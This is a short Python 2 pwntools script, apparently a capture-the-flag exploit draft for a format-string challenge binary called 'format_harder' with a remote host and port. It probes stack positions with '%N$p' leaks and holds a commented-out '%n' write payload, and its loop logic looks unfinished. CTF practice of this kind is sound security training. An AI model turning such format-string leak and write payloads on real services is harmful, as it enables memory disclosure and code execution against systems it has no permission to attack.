#!/usr/bin/env python2
from pwn import *
import sys
context.log_level = 'error'
HOST = '128.199.104.41'
PORT = 42069
BINARY = './format_harder'


def exploit(p, local=True):
    #Where you put the exploit
    a = p.recvline().strip().split(' ')[8]
    addr = int(a,16)
    # print "Address: {}".format(hex(addr))
    # payload = "%420c%9$n"
    # p.sendline(payload)
    for i in range(20):
        p = process(BINARY)
        memleak = p.recvline().strip().split(' ')[8]
        payload = "%{}$p".format(i)
        p.sendline(payload)
        leak = p.recvall().strip().split('\n')[1]
        print "Address: {} {}: {} ".format(memleak, i, leak)
        p.close()
    p.interactive()




if __name__ == "__main__":
    if (len(sys.argv) == 2):
        # remote
        r = remote(HOST, PORT)
        exploit(r,False)
    else:
        # local
        p = process(BINARY)
        exploit(p)